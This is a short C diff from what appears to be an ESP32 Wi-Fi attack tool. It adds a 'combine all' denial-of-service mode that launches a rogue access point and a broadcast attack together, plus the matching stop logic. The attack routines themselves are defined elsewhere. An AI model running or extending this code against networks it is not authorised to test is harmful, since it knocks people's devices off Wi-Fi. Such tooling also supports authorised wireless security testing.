@@ -31,6 +31,11 @@ void attack_dos_start(attack_config_t *attack_config) {
             ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
             attack_method_rogueap(attack_config->ap_record);
             break;
+        case ATTACK_DOS_METHOD_COMBINE_ALL:
+            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
+            attack_method_rogueap(attack_config->ap_record);
+            attack_method_broadcast(attack_config->ap_record, 1);
+            break;
         default:
             ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
     }
@@ -42,6 +47,11 @@ void attack_dos_stop() {
             attack_method_broadcast_stop();
             break;
         case ATTACK_DOS_METHOD_ROGUE_AP:
+            wifictl_mgmt_ap_start();
+            wifictl_restore_ap_mac();
+            break;
+        case ATTACK_DOS_METHOD_COMBINE_ALL:
+            attack_method_broadcast_stop();
             wifictl_mgmt_ap_start();
             wifictl_restore_ap_mac();
             break;
